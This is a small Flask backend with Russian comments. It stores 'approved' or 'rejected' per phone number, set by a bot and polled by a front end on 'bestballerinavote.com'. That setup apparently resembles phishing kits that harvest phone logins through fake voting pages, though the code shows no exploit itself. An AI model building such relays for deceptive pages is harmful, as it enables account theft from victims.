import os # Добавляем импорт os для работы с переменной окружения PORT
from flask import Flask, request, jsonify
from flask_cors import CORS

responses = {} # <<< ВНИМАНИЕ: Данные хранятся в памяти и будут потеряны при перезапуске сервера!
app = Flask(__name__)

# --- НАСТРОЙКА CORS ---
# Разрешаем запросы только с вашего фронтенда
CORS(app, resources={r"/*": {"origins": ["https://www.bestballerinavote.com"]}}) # <-- ИЗМЕНЕНИЕ ЗДЕСЬ

@app.route("/check-response", methods=["GET"])
def check_response():
    phone = request.args.get("phone")
    status = responses.get(phone)
    print(f"[CHECK] phone: {phone}, status: {status}") # Оставляем логирование
    return jsonify({"status": status or "waiting"})

# --- ИЗМЕНЕНИЕ ИМЕНИ РОУТА И ФУНКЦИИ ---
# Меняем "/set-response" на "/user-request", чтобы соответствовать тому, что ожидает бот
@app.route("/user-request", methods=["POST"])
def user_request(): # Меняем имя функции для ясности
    data = request.json
    if not data:
         print("[POST /user-request] Error: No JSON data received")
         return jsonify({"error": "No JSON data received"}), 400

    phone = data.get("phone")
    result = data.get("result") # 'approved' or 'rejected'

    if not phone or not result:
        print(f"[POST /user-request] Error: Missing 'phone' or 'result' in JSON data: {data}")
        return jsonify({"error": "Missing 'phone' or 'result'"}), 400

    responses[phone] = result # Сохраняем результат в памяти
    print(f"[SET /user-request] phone: {phone}, result: {result}") # Оставляем логирование
    return jsonify({"success": True}) # Возвращаем успех

if __name__ == "__main__":
    # --- ИЗМЕНЕНИЕ ДЛЯ RAILWAY ---
    # Получаем порт из переменной окружения PORT, по умолчанию 5000
    port = int(os.environ.get('PORT', 5000))
    # Запускаем на 0.0.0.0, чтобы быть доступным в контейнере Railway
    print(f"Starting Flask server on host 0.0.0.0 port {port}")
    app.run(host="0.0.0.0", port=port, debug=False) # debug=False для продакшена!
